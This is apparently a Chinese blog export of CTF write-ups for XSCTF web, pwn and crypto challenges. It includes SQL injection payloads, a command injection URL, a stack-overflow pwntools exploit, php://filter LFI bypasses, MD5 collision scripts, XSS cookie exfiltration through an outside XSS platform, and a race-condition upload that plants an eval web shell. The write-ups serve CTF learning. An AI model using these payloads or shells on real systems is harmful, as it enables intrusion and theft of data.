_0x2badaa=[&#x27;920aGutvi&#x27;,&#x27;517wlRFdu&#x27;,&#x27;221112hjXCvb&#x27;,&#x27;169436bqkkfr&#x27;,&#x27;8dhAXCJ&#x27;,&#x27;12838203EfwKcG&#x27;,&#x27;log&#x27;,&#x27;CgogX18gICBfXyAgIF9fX19fICAgIF9fX19fICAgX19fX19fXyAgIF9fX19fXyAgICAgX18gICAgICAgICAgICAgICAgICAgICAgICAgICAgICBfX19fXyAgICAgICAgICAgXyAgIF8gICAgIF8gICAgICAgICAgIF8gICAgICAgICAgICBfX19fX18gICAgICAgICAgICAgICAgICBfXyAgICAgICAgICAgICAgICAgIF8gIF8gICAgIF8gICAgIF8gICAgX19fICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgX18gICAgICAgICAgICAgX19fXyAgICBfICAgICAgICBfXyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXyAgICAgXyAgICAgICAgICAgICAgICAgIF9fICAgCiBcIFwgLyAvICAvIF9fX198ICAvIF9fX198IHxfXyAgIF9ffCB8ICBfX19ffCAgIC8gLyAgICAgL1wgICAgICAgICAgICAgICAgICAgICAgfF8gICBffCAgICAgICAgIChfKSB8IHwgICAoXykgICAgICAgICB8IHwgICAgICAgICAgfCAgX19fX3wgICAgICAgICAgICAgICAgL18gfCAgICAgICAgICAgICAgICB8IHx8IHwgICB8IHwgICAoXykgIC8gXyBcICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8gX3wgICAgICAgICAgIC8gX18gXCAgfCB8ICAgICAgLyBffCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHwgfCAgIChfKSAgICAgICAgICAgICAgICAgXCBcICAKICBcIFYgLyAgfCAoX19fICAgfCB8ICAgICAgICAgfCB8ICAgIHwgfF9fICAgICB8IHwgICAgIC8gIFwgICAgIF8gX18gICAgICAgICAgICAgIHwgfCAgICBfIF9fICAgIF8gIHwgfF8gICBfICAgIF9fIF8gIHwgfCAgICAgICAgICB8IHxfXyAgICBfXyAgX18gIF8gX18gICAgfCB8ICAgX19fICAgIF8gX18gIHwgfHwgfF8gIHwgfF8gICBfICB8IHwgfCB8ICBfIF9fICAgICAgICAgICAgICBfX18gICB8IHxfICAgICAgICAgICB8IHwgIHwgfCB8IHxfXyAgIHwgfF8gICBfICAgXyAgIF9fXyAgICBfX18gICAgX18gXyAgfCB8XyAgIF8gICAgX19fICAgIF8gX18gICAgfCB8IAogICA+IDwgICAgXF9fXyBcICB8IHwgICAgICAgICB8IHwgICAgfCAgX198ICAgLyAvICAgICAvIC9cIFwgICB8ICdfIFwgICAgICAgICAgICAgfCB8ICAgfCAnXyBcICB8IHwgfCBfX3wgfCB8ICAvIF9gIHwgfCB8ICAgICAgICAgIHwgIF9ffCAgIFwgXC8gLyB8ICdfIFwgICB8IHwgIC8gXyBcICB8ICdfX3wgfF9fICAgX3wgfCBfX3wgfCB8IHwgfCB8IHwgfCAnXyBcICAgICAgICAgICAgLyBfIFwgIHwgIF98ICAgICAgICAgIHwgfCAgfCB8IHwgJ18gXCAgfCAgX3wgfCB8IHwgfCAvIF9ffCAgLyBfX3wgIC8gX2AgfCB8IF9ffCB8IHwgIC8gXyBcICB8ICdfIFwgICAgXCBcCiAgLyAuIFwgICBfX19fKSB8IHwgfF9fX18gICAgIHwgfCAgICB8IHwgICAgICBcIFwgICAgLyBfX19fIFwgIHwgfCB8IHwgICAgICAgICAgIF98IHxfICB8IHwgfCB8IHwgfCB8IHxfICB8IHwgfCAoX3wgfCB8IHwgICAgICAgICAgfCB8X19fXyAgID4gIDwgIHwgfF8pIHwgIHwgfCB8IChfKSB8IHwgfCAgICAgICB8IHwgICB8IHxfICB8IHwgfCB8X3wgfCB8IHwgfCB8ICAgICAgICAgIHwgKF8pIHwgfCB8ICAgICAgICAgICAgfCB8X198IHwgfCB8XykgfCB8IHwgICB8IHxffCB8IFxfXyBcIHwgKF9fICB8IChffCB8IHwgfF8gIHwgfCB8IChfKSB8IHwgfCB8IHwgICAvIC8KIC9fLyBcX1wgfF9fX19fLyAgIFxfX19fX3wgICAgfF98ICAgIHxffCAgICAgICB8IHwgIC9fLyAgICBcX1wgfF98IHxffCAgICAgICAgICB8X19fX198IHxffCB8X3wgfF98ICBcX198IHxffCAgXF9fLF98IHxffCAgICAgICAgICB8X19fX19ffCAvXy9cX1wgfCAuX18vICAgfF98ICBcX19fLyAgfF98ICAgICAgIHxffCAgICBcX198IHxffCAgXF9fXy8gIHxffCB8X3wgICAgICAgICAgIFxfX18vICB8X3wgICAgICAgICAgICAgXF9fX18vICB8Xy5fXy8gIHxffCAgICBcX18sX3wgfF9fXy8gIFxfX198ICBcX18sX3wgIFxfX3wgfF98ICBcX19fLyAgfF98IHxffCAgfCB8IAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcX1wgICAgICAgICAgICAgICAgICAgICBfX19fX18gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBfX19fX18gICAgICAgICAgICAgICAgICB8IHwgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgX19fX19fICAgICAgICAgICAgICAgICBfX19fX18gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC9fLyAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfF9fX19fX3wgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfF9fX19fX3wgICAgICAgICAgICAgICAgIHxffCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHxfX19fX198ICAgICAgICAgICAgICAgfF9fX19fX3wgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKCg==&#x27;,&#x27;3076824IERKkW&#x27;,&#x27;6626otVnDv&#x27;,&#x27;4488330eyQBas&#x27;,&#x27;7196435AHLNnm&#x27;];_0x1173=function()&#123;return _0x2badaa;&#125;;return _0x1173();&#125;(function(_0x3fa77a,_0x506be4)&#123;var _0x324ad3=_0xe50d,_0x1b9807=_0x3fa77a();while(!![])&#123;try&#123;var _0x5cf5b7=-parseInt(_0x324ad3(0x107))/0x1*(-parseInt(_0x324ad3(0x10f))/0x2)+-parseInt(_0x324ad3(0x10e))/0x3+parseInt(_0x324ad3(0x109))/0x4+parseInt(_0x324ad3(0x105))/0x5+-parseInt(_0x324ad3(0x110))/0x6+parseInt(_0x324ad3(0x10b))/0x7*(parseInt(_0x324ad3(0x10a))/0x8)+-parseInt(_0x324ad3(0x108))/0x9*(parseInt(_0x324ad3(0x106))/0xa);if(_0x5cf5b7===_0x506be4)break;else _0x1b9807[&#x27;push&#x27;](_0x1b9807[&#x27;shift&#x27;]());&#125;catch(_0x29c073)&#123;_0x1b9807[&#x27;push&#x27;](_0x1b9807[&#x27;shift&#x27;]());&#125;&#125;&#125;(_0x1173,0xf2d11),console[_0x21b6c9(0x10c)](atob(_0x21b6c9(0x10d)))); 直接复制到浏览器控制台 123456789__ __ _____ _____ _______ ______ __ _____ _ _ _ _ ______ __ _ _ _ _ ___ __ ____ _ __ _ _ __ \\ \\ &#x2F; &#x2F; &#x2F; ____| &#x2F; ____| |__ __| | ____| &#x2F; &#x2F; &#x2F;\\ |_ _| (_) | | (_) | | | ____| &#x2F;_ | | || | | | (_) &#x2F; _ \\ &#x2F; _| &#x2F; __ \\ | | &#x2F; _| | | (_) \\ \\ \\ V &#x2F; | (___ | | | | | |__ | | &#x2F; \\ _ __ | | _ __ _ | |_ _ __ _ | | | |__ __ __ _ __ | | ___ _ __ | || |_ | |_ _ | | | | _ __ ___ | |_ | | | | | |__ | |_ _ _ ___ ___ __ _ | |_ _ ___ _ __ | | &gt; &lt; \\___ \\ | | | | | __| &#x2F; &#x2F; &#x2F; &#x2F;\\ \\ | &#39;_ \\ | | | &#39;_ \\ | | | __| | | &#x2F; _&#96; | | | | __| \\ \\&#x2F; &#x2F; | &#39;_ \\ | | &#x2F; _ \\ | &#39;__| |__ _| | __| | | | | | | | &#39;_ \\ &#x2F; _ \\ | _| | | | | | &#39;_ \\ | _| | | | | &#x2F; __| &#x2F; __| &#x2F; _&#96; | | __| | | &#x2F; _ \\ | &#39;_ \\ \\ \\ &#x2F; . \\ ____) | | |____ | | | | \\ \\ &#x2F; ____ \\ | | | | _| |_ | | | | | | | |_ | | | (_| | | | | |____ &gt; &lt; | |_) | | | | (_) | | | | | | |_ | | | |_| | | | | | | (_) | | | | |__| | | |_) | | | | |_| | \\__ \\ | (__ | (_| | | |_ | | | (_) | | | | | &#x2F; &#x2F;&#x2F;_&#x2F; \\_\\ |_____&#x2F; \\_____| |_| |_| | | &#x2F;_&#x2F; \\_\\ |_| |_| |_____| |_| |_| |_| \\__| |_| \\__,_| |_| |______| &#x2F;_&#x2F;\\_\\ | .__&#x2F; |_| \\___&#x2F; |_| |_| \\__| |_| \\___&#x2F; |_| |_| \\___&#x2F; |_| \\____&#x2F; |_.__&#x2F; |_| \\__,_| |___&#x2F; \\___| \\__,_| \\__| |_| \\___&#x2F; |_| |_| | | \\_\\ ______ ______ | | ______ ______ &#x2F;_&#x2F; |______| |______| |_| |______| |______| 拉伸一下就可以看到flag（换成不会自动换行的文本编辑软件，如notepad++） XSCTF&#123;An_Initial_Exp1or4ti0n_of_Obfuscation&#125; saveSaofe1a_partA考sql注入测试一下发现是字符型查询，并且存在联合注入 首先查询当前数据库 然后查询该数据库下的表 然后查询表下的字段 根据题目提示，逐个翻表 123456-1&#x27; union select database(),2,3,4#-1&#x27; union select group_concat(table_name),2,3,4 from information_schema.tables where table_schema=&#x27;student&#x27;#-1&#x27; union select group_concat(column_name),2,3,4 from information_schema.columns where table_name=&#x27;class1&#x27;#-1&#x27; union select group_concat(id),group_concat(name),group_concat(class),group_concat(hobbies) from class1#-1&#x27; union select group_concat(id),group_concat(name),group_concat(class),group_concat(hobbies) from class2#-1&#x27; union select group_concat(id),group_concat(name),group_concat(class),group_concat(hobbies) from class3# XSCTF&#123;Saofe1a_r3a11y_l0ve_xiaomei&#125; saveSaofe1a_partB同样是sql注入经过测试：让我想想除了insert、where、delete、select、drop、update和.你们大黑阔还有什么招嘻嘻，想起来了，set、prepare、execute也不行哦 用handler可以查 1-1&#x27;;handler `2333` open;handler `2333` read first;handler `2333` close;# 如果不在第一条，但是题目又过滤了where关键字，可以使用limit 1-1&#x27;;handler `class3` open;handler `class3` read first limit 30,1;handler `class3` close;# XSCTF&#123;Saofe1a_wAnt_a_9ir1fri3nd&#125; 燕子不要走~12345678910//燕子，燕子，没有你我怎么活啊，不要甩开我啊 function hello_shell($cmd)&#123; system($cmd.&quot;&gt;/dev/null 2&gt;&amp;1&quot;); &#125; isset($_GET[&#x27;cmd&#x27;]) ? hello_shell($_GET[&#x27;cmd&#x27;]) : null; highlight_file(__FILE__); ?&gt; 直接用分号隔开即可?cmd=cat /flag; XSCTF&#123;Yanz1_i_w1sh_y0u_hApp1neSs&#125; gift_RSA123456789101112131415161718from Crypto.Util.number import *from secret import flagm = bytes_to_long(flag)p = getStrongPrime(512)q = getStrongPrime(512)n = p*qe = 0x10001phi = (p-1)*(q-1)d = inverse(e, phi)gift = pow(m, d, n)print(f&#x27;n = &#123;n&#125;&#x27;)print(f&#x27;gift = &#123;gift&#125;&#x27;)&quot;&quot;&quot;n = 130440460982994054886194132893343627339035187428107218807321147405620338019874355591446417761513664225266160038818394605319887375239391287230478660163653875242501357695986002630460984513202850115668909532480905521208688225215737924902179053646260998230998190491472420237789646660909155287180241747552560215117gift = 44036549032562248382682022800700872356499366761892236792447591596664499865604669855744690854360939082917175165565199000408965931210082233109686848459850428016737476624525455409019711542678368419364411036613979498284492060998121701989232698779962405921949163953624713959841997664118682769289019562394455997308&quot;&quot;&quot; 根据公钥加密算法的特性，公私钥互换效果是一样的，这里用私钥加密（签名），就可以使用公钥解密（验证） exp 1234567from Crypto.Util.number import *e = 0x10001c = 44036549032562248382682022800700872356499366761892236792447591596664499865604669855744690854360939082917175165565199000408965931210082233109686848459850428016737476624525455409019711542678368419364411036613979498284492060998121701989232698779962405921949163953624713959841997664118682769289019562394455997308n = 130440460982994054886194132893343627339035187428107218807321147405620338019874355591446417761513664225266160038818394605319887375239391287230478660163653875242501357695986002630460984513202850115668909532480905521208688225215737924902179053646260998230998190491472420237789646660909155287180241747552560215117print(long_to_bytes(pow(c, e, n))) XSCTF&#123;H3re_i5_@_Gif7_f0r_y0u_From_Euler:)))))!&#125; 你说你是凯撒大帝尊嘟假嘟啊1Öv0 0vo O.0 O_Ö Övo 0vo ov0 ovÖ o.Ö owÖ 0.o OwÖ o.O Ö.O O_0 o_Ö Ö_0 OwÖ Ov0 0wÖ Ö.Ö owO 0v0 o.O o.Ö Ö.0 o.0 ovO o.Ö Ö.o 0vo Ow0 Ö.Ö owo 0_0 0.0 o.Ö Ö.O O.0 O_0 o_O 0vÖ owo 尊嘟假嘟O.o (zdjd.vercel.app) 解密之后凯撒爆破 XSCTF&#123;gr3at_y0u_aRe_reA1_CaesAr&#125;","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://uniqueland.top/tags/ctf/"}]},{"title":"XSCTF_warmup","slug":"xsctf_warmup","date":"2024-11-04T15:29:52.430Z","updated":"2024-11-09T19:28:26.494Z","comments":true,"path":"2024/11/04/xsctf_warmup/","link":"","permalink":"http://uniqueland.top/2024/11/04/xsctf_warmup/","excerpt":"","text":"babystack附件：babystack 123456789101112131415161718192021222324252627282930int __cdecl main(int argc, const char **argv, const char **envp)&#123; __int16 v4; // [rsp+Eh] [rbp-2h] init_func(argc, argv, envp); start_show(); puts(&amp;s); __isoc99_scanf(v4); vuln(v4); return 0;&#125;ssize_t __fastcall vuln(unsigned int a1)&#123; char buf[80]; // [rsp+10h] [rbp-50h] BYREF if ( a1 &lt;= 0x7FFFFFFE ) &#123; printf(format); exit(0); &#125; puts(&amp;byte_402038); puts(&amp;byte_40205D); return read(0, buf, 0x8848uLL);&#125;int backdoor()&#123; return system(&quot;/bin/sh&quot;);&#125; 对于第一个比较，直接输入-1 对于read函数，输入80+8个字符之后再输入需要返回的地址（backdoor）即可 exp 12345678910111213from pwn import *r = remote(&#x27;43.248.97.213&#x27;, 40054)elf = ELF(&#x27;./babystack&#x27;)sysaddr = elf.symbols[&#x27;backdoor&#x27;]print(&#x27;0x%x&#x27;%sysaddr)r.recv()r.sendline(b&#x27;-1&#x27;)r.recv()r.sendline(b&#x27;a&#x27;*80 + b&#x27;b&#x27;*8 + p64(sysaddr))r.interactive() 正常来说这么写没问题，但是运行的时候不会返回shell原因估计是堆栈平衡之类的问题，解决的方法是直接返回到调用system函数的地址，跳过栈操作 exp 1234567891011from pwn import *r = remote(&#x27;43.248.97.213&#x27;, 40054)elf = ELF(&#x27;./babystack&#x27;)r.recv()r.sendline(b&#x27;-1&#x27;)sleep(2)r.send(b&#x27;a&#x27;*80 + b&#x27;b&#x27;*8 + p64(0x4012bf))r.interactive() 坑 当返回到后门函数行不通的时候，返回到调用system函数的语句 Windows和Linux平台运行同一份exp的结果可能不同 XSCTF&#123;E49AA5B5-B7DA-769B-4AE7-F40A17E09A04&#125; Badbad_filenameGET me a filename and I&#39;ll include it!测试一下发现过滤了php、filter、base、data、file等关键字然后就搜一堆绕过的方法 如果base被绕过了，可以使用url编码convert往后，resource往前的字符?filename=pHp://filtEr/convert.%2562%2561%2573%2565%2536%2534%252d%2565%256e%2563%256f%2564%2565/resource= 除了测试文件/etc/passwd之外，如果是nginx，可以考虑读日志/var/log/nginx/access.log 如果读flag.php，记得先访问一下看看页面是否存在 最后，这道题的解法是最简单的双写绕过?filename=pphphp://filfilterter/convert.basbasee64-encode/resource=flag.pphphp XSCTF&#123;d0ubLe_Wr1te_2_byPass&#125; 麻了 canyoupassit1234567891011121314151617181920&lt;?php highlight_file(__FILE__); error_reporting(0); if ($_POST[&#x27;a1&#x27;] != $_POST[&#x27;b1&#x27;] &amp;&amp; md5($_POST[&#x27;a1&#x27;] == md5($_POST[&#x27;b1&#x27;])))&#123; echo &quot;恭喜你过了第一关!&quot;; &#125; else &#123; die(&quot;就这?&quot;); &#125; if ($_POST[&#x27;key&#x27;] == md5($_POST[&#x27;key&#x27;])) &#123; echo &quot;恭喜你过了第二关!&quot;; &#125; else &#123; die(&quot;再看看?&quot;); &#125; $now = time(); if ($_POST[&#x27;a2&#x27;] != $_POST[&#x27;b2&#x27;] &amp;&amp; str_starts_with($_POST[&#x27;a2&#x27;], $now) &amp;&amp; str_starts_with($_POST[&#x27;b2&#x27;], $now) &amp;&amp; md5($_POST[&#x27;a2&#x27;] === md5($_POST[&#x27;b2&#x27;])))&#123; echo &quot;恭喜你过了第三关!&quot;; include &quot;/flag&quot;; &#125; else &#123; die(&quot;真可惜，就差最后一步了&quot;); &#125; 这是一道有关md5绕过的题目，主要分为三个部分 不同值的变量，md5的值是一样的（弱比较） – md5弱碰撞 md5值等于自身的值（弱比较） – 0e绕过 不同值的md5是一样的（强比较），且要求两个值都有特定前缀 解决的方法如下： 对于弱比较的md5值，可以直接百度特定的值 QNKCDZO 240610708 s878926199a s155964671a s214587387a s214587387a这些字符串的 md5 值都是 0e 开头，在 php 弱类型比较中判断为相等 对于若比较的$a == md5($a)，存在0e开头的值md5之后还是0e开头，这样在弱比较中仍然相等，如0e215962017 对于强比较，可以采用md5强碰撞的方式，网上有特定的值可以满足值不同但是md5值相同，但是这里存在另外一个问题，就是这两个值的前缀必须是当前时间，这就需要自己生成特定的两个值，使用fastcoll工具，可以生成特定前缀的值来满足条件，这个特定前缀就是当前时间 1234567891011121314151617181920212223242526272829import requestsimport osimport timet = int(time.time()+10)with open(&#x27;t.txt&#x27;, &#x27;w&#x27;) as f: f.write(str(t))os.system(&quot;fastcoll_v1.0.0.5.exe t.txt&quot;)a2 = open(&#x27;t_msg1.txt&#x27;, &#x27;rb&#x27;).read()b2 = open(&#x27;t_msg2.txt&#x27;, &#x27;rb&#x27;).read()url = &quot;http://43.248.97.213:30038/&quot;data = &#123; &#x27;a1&#x27;: &#x27;s214587387a&#x27;, &#x27;b1&#x27;: &#x27;s155964671a&#x27;, &#x27;key&#x27; : &#x27;0e215962017&#x27;, &#x27;a2&#x27;: a2, &#x27;b2&#x27;: b2,&#125;while 1: res = requests.post(url, data=data) if &#x27;flag&#123;&#x27; in res.text: print(res.text) break 一些要注意的点 特定前缀的时间最好往后调一调，避免因网络问题导致错过时间 生成的两个txt需要以二进制的形式读取 flag&#123;y0v|nDeedReA11yk$nwAb0uTMD5!~_~^_^&#125; Ezgame进入是一个小游戏，要求达到非常高的分数 直接玩肯定不现实，于是翻翻js代码因为不是通过php记录分数的，所以不可以使用POST请求之类的修改分数 入手的思路是通过浏览器控制台访问所有的对象，然后找到存储分数的变量，直接在控制台修改变量翻了十几份代码之后去控制台查看对象，从全局对象入手，最终找到了这些 看起来像是存储游戏角色的变量于是直接修改其中的gold和kills以及high_score（不知道改哪个，干脆全改了) 1&#123;&quot;id&quot;:&quot;o1&quot;,&quot;ownerId&quot;:null,&quot;position&quot;:&#123;&quot;x&quot;:359.04999999999956,&quot;y&quot;:154.2499999999999&#125;,&quot;size&quot;:&#123;&quot;width&quot;:32,&quot;height&quot;:32&#125;,&quot;direction&quot;:&#123;&quot;x&quot;:-1,&quot;y&quot;:0&#125;,&quot;facing&quot;:&#123;&quot;x&quot;:-1,&quot;y&quot;:0&#125;,&quot;speed&quot;:150,&quot;team&quot;:0,&quot;hitPoints&quot;:100,&quot;damage&quot;:0,&quot;spriteSheet&quot;:&quot;characters&quot;,&quot;spriteX&quot;:0,&quot;spriteY&quot;:992,&quot;spriteAlign&quot;:false,&quot;animated&quot;:true,&quot;animFrameIndex&quot;:0,&quot;animNumFrames&quot;:2,&quot;animDelay&quot;:200,&quot;animElapsed&quot;:16,&quot;spawnFrameIndex&quot;:0,&quot;spawnFrameCount&quot;:2,&quot;spawnFramesX&quot;:0,&quot;spawnFramesY&quot;:0,&quot;angle&quot;:0,&quot;rotateSpeed&quot;:400,&quot;rotate&quot;:false,&quot;worth&quot;:0,&quot;ttl&quot;:0,&quot;ttlElapsed&quot;:0,&quot;alpha&quot;:1,&quot;alphaMod&quot;:-1,&quot;gibletSize&quot;:&quot;small&quot;,&quot;cooldown&quot;:false,&quot;cooldownElapsed&quot;:0,&quot;autoFire&quot;:false,&quot;soundAttacks&quot;:&quot;hero_attacks&quot;,&quot;soundDamage&quot;:&quot;hero_damage&quot;,&quot;soundDies&quot;:&quot;hero_dies&quot;,&quot;alive&quot;:true,&quot;states&quot;:[&#123;&quot;type&quot;:0,&quot;timer&quot;:&#123;&quot;elapsed_ms&quot;:43298,&quot;ttl&quot;:0&#125;&#125;,null,null],&quot;currentWeaponIndex&quot;:1,&quot;collidable&quot;:true,&quot;bounce&quot;:true,&quot;piercing&quot;:false,&quot;achievementId&quot;:null,&quot;deathsForAchievement&quot;:null,&quot;ignoreLogDeath&quot;:false,&quot;damageType&quot;:null,&quot;drawIndex&quot;:1,&quot;moveChangeElapsed&quot;:0,&quot;moveChangeDelay&quot;:500,&quot;wounds&quot;:15,&quot;weapons&quot;:[&#123;&quot;type&quot;:&quot;h_sword&quot;,&quot;count&quot;:null&#125;,&#123;&quot;type&quot;:&quot;h_spear&quot;,&quot;count&quot;:82&#125;],&quot;gold&quot;:1000000000,&quot;kills&quot;:10000000000,&quot;timesWounded&quot;:1,&quot;totalDamageTaken&quot;:15,&quot;shotsFired&quot;:108,&quot;shotsLanded&quot;:65,&quot;shotsPerWeapon&quot;:&#123;&quot;h_sword&quot;:28,&quot;h_knife&quot;:31,&quot;h_spear&quot;:18&#125;,&quot;meatEaten&quot;:0,&quot;cheater&quot;:false,&quot;phase&quot;:0,&quot;phaseInit&quot;:false,&quot;lootTable&quot;:[],&quot;killSwitch&quot;:false,&quot;type&quot;:&quot;hero&quot;,&quot;role&quot;:&quot;hero&quot;,&quot;isMeatboy&quot;:false,&quot;bloodTimer&quot;:null&#125; 然后返回游戏发现数据没有变化以为错了，退出去，然后在主界面发现了flag flag&#123;basju_D0G006706_iajdisaia&#125; hardphp进入题目什么都没有，只有一句话尝试大声喊出v我50!!!我就会给你flag只能扫后台了 12345678910111213141516171819202122232425262728293031323334353637~$ dirsearch -u http://43.248.97.213:30090/ _|. _ _ _ _ _ _|_ v0.4.2 (_||| _) (/_(_|| (_| )Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927Output File: /home/xr/.dirsearch/reports/43.248.97.213-30090/-_24-10-28_22-14-33.txtError Log: /home/xr/.dirsearch/logs/errors-24-10-28_22-14-33.logTarget: http://43.248.97.213:30090/[22:14:33] Starting:[22:14:37] 403 - 223B - /.htaccess.orig[22:14:37] 403 - 225B - /.htaccess.sample[22:14:37] 403 - 223B - /.htaccess.bak1[22:14:37] 403 - 220B - /.ht_wsr.txt[22:14:37] 403 - 223B - /.htaccess.save[22:14:37] 403 - 224B - /.htaccess_extra[22:14:38] 403 - 221B - /.htaccess_sc[22:14:38] 403 - 223B - /.htaccess_orig[22:14:38] 403 - 214B - /.html[22:14:38] 403 - 219B - /.htpasswds[22:14:38] 403 - 221B - /.htaccessBAK[22:14:38] 403 - 221B - /.htaccessOLD[22:14:38] 403 - 213B - /.htm[22:14:38] 403 - 222B - /.htaccessOLD2[22:14:38] 403 - 220B - /.httr-oauth[22:14:38] 403 - 223B - /.htpasswd_test[22:15:05] 200 - 304B - /index.php[22:15:05] 200 - 304B - /index.php/login/[22:15:17] 403 - 222B - /server-status[22:15:17] 403 - 223B - /server-status/[22:15:25] 200 - 825B - /www.zipTask Completed 扫出来三个，其中www.zip是网站的备份解压之后发现有个flagflaghhh.php 12345678910111213141516&lt;?php error_reporting(0); highlight_file(__FILE__); $input = $_POST[&#x27;a&#x27;]; if (isset($input)) &#123; if (substr($input, 0, 5) == &quot;vme50&quot; and substr($input, -1, 1) == &quot;!&quot;) &#123; if ($input == &quot;vme50!&quot;) &#123; die(&quot;Speak a little louder, I can&#x27;t hear you!&quot;); &#125; if (preg_match(&#x27;/vme50.+?!/is&#x27;, $input)) &#123; die(&quot;xing bu xing a.Speak much louder!&quot;); &#125; system(&quot;cat /flag&quot;); &#125; else echo &quot;Bie lai zhan bian!!!&quot;; &#125; 对传入的a参数有三个条件 以vme50为开头，以感叹号为末尾 不可以是vme50 不可以满足正则表达式/vme50.+?!/is，该正则表达式的意思是匹配以vme50开头，以感叹号为末尾，且数字0后面有若干个零的字符串，一旦匹配到就算失败 /：正则表达式的开始和结束标记。 vme50：字面意义上的字符串 “vme50”，表示匹配文本中包含 “vme50” 的部分。 .：点号（.）在正则表达式中是一个特殊字符，表示匹配任意单个字符（除了换行符）。 +：加号（+）表示前面的字符（在这个例子中是点号 .）出现一次或多次。 ?：问号（?）在这里与 + 结合使用，表示前面的字符（点号 .）出现一次或多次，但尽可能少地匹配，这是一种非贪婪匹配。 !：感叹号（!）在这里是一个普通字符，表示匹配文本中包含 ! 的部分。 /is：这是正则表达式的修饰符部分，i 表示不区分大小写，s 表示点号 . 可以匹配任意字符，包括换行符。 仔细观察就会发现条件2和条件3冲突了，因此绕不过preg_match但是函数preg_match存在一个限制，就是匹配的次数，超过一定次数的匹配会直接返回FALSE，这个限制一般是100万所以 1234567891011import requestsurl = &quot;http://43.248.97.213:30090/flagflagflaghhh.php&quot;data = &#123; #&#x27;a&#x27;: &#x27;vme50&#x27;+&#x27;!&#x27;*279620100 &#x27;a&#x27;: &#x27;vme50&#x27;+&#x27;0&#x27;*1000000+&#x27;!&#x27;&#125;res = requests.post(url=url, data=data)print(res.text) flag&#123;haHa_tHiS_Is_V_mE50_F1@G&#125; KFC 主要考点：HTTP header各字段的含义及格式 进入题目连接，除了一张无意义的图片之外就是Are you come from localhost?猜测修改XFF，即X-Forwarded-For: 127.0.0.1 发包返回Are you jump from KFC&#39;s website?(http:****.cn)猜测修改Referer，搜索kfc的网址https://kfcapp.cn/，即Referer: https://kfcapp.cn/ 发包返回Have you v me 50?这下不懂了，但是仔细观察发现返回的包中header多了一个money的字段 123456789101112HTTP&#x2F;1.1 200 OKDate: Sat, 26 Oct 2024 17:57:44 GMTServer: Apache&#x2F;2.4.10 (Debian) PHP&#x2F;5.4.45X-Powered-By: PHP&#x2F;5.4.45money: 0Vary: Accept-EncodingContent-Length: 106Keep-Alive: timeout&#x3D;5, max&#x3D;100Connection: Keep-AliveContent-Type: text&#x2F;html&lt;p style&#x3D;&quot;text-align: center;&quot;&gt;&lt;img src&#x3D;&quot;.&#x2F;v50.jpg&quot; alt&#x3D;&quot;&quot; width&#x3D;132px height&#x3D;188px&gt; &lt;&#x2F;p&gt;Have you v me 50? 故猜测在header增加一个money的字段，值为50，即money: 50 flag&#123;0k_!_G1v3_Y0u_th3_f1l@g_!_!&#125; kk园区审核员善良的出题人组织了一次kk园区的参观活动，现在收集有意向前往的人员信息，提交后工作人员会第一时间审核哦，审核通过还能得到审核的美味曲奇奖励！ 填表 - 提交 - 审核cookie猜测是xss cookie外带 找xss平台 复制payload并填表 提交并返回xss平台看记录 XSS平台-XSS测试网站-仅用于安全免费测试 (xssaq.com) reallyExpensive给了十块钱的余额要买好贵的flag抓包改购买的数目 flag&#123;^==^Y0uG@t$(t]$[r)^u^(e)-F10g!^&lt;&gt;^&#125; upload_quick进入页面什么也干不了，没有找到文件上传的路径文件上传的页面藏在js文件里 根据题目猜测条件竞争 123456789101112131415161718192021222324252627POST &#x2F;Upl00000000ad.php HTTP&#x2F;1.1Host: 43.248.97.213:30014Content-Length: 331Pragma: no-cacheCache-Control: no-cacheUpgrade-Insecure-Requests: 1User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;127.0.0.0 Safari&#x2F;537.36 Edg&#x2F;127.0.0.0Origin: http:&#x2F;&#x2F;43.248.97.213:30014Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryY7TKFDA8ZwPEXpcSAccept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.7Referer: http:&#x2F;&#x2F;43.248.97.213:30014&#x2F;Upl00000000ad.phpAccept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8,en-GB;q&#x3D;0.7,en-US;q&#x3D;0.6Cookie: JSESSIONID&#x3D;886AD2DD7B34B204841F70E0D9696242Connection: keep-alive------WebKitFormBoundaryY7TKFDA8ZwPEXpcSContent-Disposition: form-data; name&#x3D;&quot;upload_file&quot;; filename&#x3D;&quot;cmd.php&quot;Content-Type: application&#x2F;octet-stream&lt;?php fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[cmd]); ?&gt;&#39; ); ?&gt;------WebKitFormBoundaryY7TKFDA8ZwPEXpcSContent-Disposition: form-data; name&#x3D;&quot;submit&quot;ä¸ä¼ ------WebKitFormBoundaryY7TKFDA8ZwPEXpcS-- 重复发包的同时访问这个页面，生成shell.php，然后远程连接就可以了 flag&#123;9d097988-5eae-4c3b-86ac-d9b53ce4f340&#125; 